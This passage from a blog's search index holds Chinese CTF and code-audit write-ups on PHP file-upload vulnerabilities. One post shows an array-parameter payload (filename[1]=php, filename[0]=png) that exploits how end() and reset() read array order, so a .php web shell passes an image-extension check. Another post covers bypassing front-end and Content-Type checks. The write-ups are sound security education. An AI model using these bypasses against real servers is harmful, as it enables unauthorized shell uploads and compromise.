$_POST[‘filename’];</p></blockquote><p>如果没有POST该字段，$file变量取上传时的name，即** $_FILES[‘file’][‘name’] **</p><p>若$file文件名不是数组，就对字符串中的点号. 进行explode分割，分割成数组<br>如上传aa.bb.php会被切为</p><p>[0]  = &gt; ‘aa’</p><p>[1] =&gt; ‘bb’</p><p>[2] =&gt; ‘php’</p><p>这样的数组</p><p><strong>获取扩展名代码</strong></p><blockquote><p>$ext = end($file);</p></blockquote><p>利用了end函数，这个函数可以返回数组的最后一项。</p><p>也就返回了最后的php作为$ext，再经过判断ext是否是jpg、png、gif的一种。</p><h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><p>利用end reset函数的缺陷<br>举个例子：</p><pre><code>&lt;?php$arr = array();$arr[0] = &#39;first&#39;;$arr[1] = &#39;second&#39;;$arr[2] = &#39;third&#39;;var_dump($arr);echo &quot;the result of reset: &quot;.reset($arr).&quot;n&quot;;echo &quot;the result of end: &quot;.end($arr);?&gt;</code></pre><p>end 函数原本的作用就是返回数组的最后一个元素，在上面看的是正常的。但是如果我们这里把对数组赋值的顺序换一下（先给 arr[2] 赋值），可以看到结果就变了。<br>继续尝试会发现 reset 函数也是一样，第一个给数组赋值的值就是 reset 函数返回的值，并不一定是arr[0]。</p><p>所以构造playload</p><blockquote><p>filename[1] = php<br>filename[0] = png</p></blockquote><p>end取的是png能通过校验<br>在后面拼接 $filename 时候，再一次拼接到后缀名，即</p><blockquote><p>$filename = reset($file) . ‘.’ . $file[count($file) - 1];</p></blockquote><p>此时$file[count($file) - 1] 取到的就是$file[2-1]-&gt;$filename[1]<br>最后拼接出了 php.php，就达到了上传 shell 的目的。</p><p><a href="https://www.anquanke.com/post/id/164561#h2-1" target="_blank" rel="noopener">https://www.anquanke.com/post/id/164561#h2-1</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>文件上传</tag>
      
      <tag>代码审计</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件上传原理及绕过</title>
    <link href="/2018/06/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87/"/>
    <url>/2018/06/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>文件上传本质是客户端向服务器端的POST请求，消息里面是上传的信息。前端上传页面需要指定 enctype 为 multipart/form-data 或者 Multipart/form-data 才能正常上传文件。</p><pre><code>&lt;form action=&#39;&#39; enctype=&#39;multipart/form-data&#39; method=&#39;POST&#39;&gt;&lt;input type=&#39;file&#39; name=&#39;file&#39;&gt;&lt;/form&gt;</code></pre><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><ul><li><p>对于上传文件的后缀名（扩展名）没有做较为严格的限制</p></li><li><p>对于上传文件的MIMETYPE 没有做检查</p></li><li><p>权限上没有对于上传的文件的文件权限，（尤其是对于shebang类型的文件）</p></li><li><p>对于web server对于上传文件或者指定目录的行为没有做限制</p></li></ul><h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><h6 id="前端绕过"><a href="#前端绕过" class="headerlink" title="前端绕过"></a>前端绕过</h6><p>表单中通过onsumbit=checkfile()调用js函数来检测文件后缀名</p><ul><li>通过firebug或burp suite来绕过</li></ul><h6 id="Content-Type"><a href="#Content-Type" class="headerlink" title="Content-Type"></a>Content-Type</h6><p>HTTP协议规定了上传资源的时候在Header中加上一项文件的MIMETYPE，来识别文件类型，这个动作是由浏览器完成的，服务端可以检查此类型</p><ul><li>抓包重放绕过，修改Content-Type</li></ul><p>MIMETYPE表</p><pre><code>text/plain（纯文本）text/html（HTML文档）text/javascript（js代码）application/xhtml+xml（XHTML文档）image/gif（GIF图像）image/jpeg（JPEG图像）image/png（PNG图像）video/mpeg（MPEG动画）application/octet-stream（二进制数据）application/pdf（PDF文档）application/(编程语言) 该种语言的代码application/msword（Microsoft Word文件）message/rfc822（RFC 822形式）multipart/alternative（HTML邮件的HTML形式和纯文本形式，相同内容使用不同形式表示）application/x-www-form-urlencoded（POST方法提交的表单）multipart/form-data（POST提交时伴随文件上传的表单）</code></pre><p>######</p>]]></content>
    
    
    
    <tags>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2018/05/23/hello-world/"/>
    <url>/2018/05/23/hello-world/</url>
    
    <content type="html"><![CDATA[<p>hello world.</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
